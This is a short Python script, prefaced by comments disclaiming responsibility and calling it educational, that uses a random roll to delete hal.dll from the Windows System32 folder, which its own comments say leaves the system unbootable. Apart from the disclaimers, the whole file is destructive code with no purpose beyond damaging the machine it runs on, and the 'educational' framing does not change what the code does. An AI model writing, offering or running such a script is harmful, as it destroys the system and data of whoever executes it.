# STRICTLY FOR EDUCATIONAL PURPOSES ONLY
# This script will delete the hal.dll file in the System32 folder of the Windows directory. This will make the system unbootable.
# I am not responsible for any damage caused by this script. Please use it in a controlled environment and only for educational purposes.
# I do not recommend running this script on your personal computer. It is intended for educational purposes only.
import os
import random
if random.randint(0, 6) == 1:
    os.remove("C:\Windows\System32\hal.dll")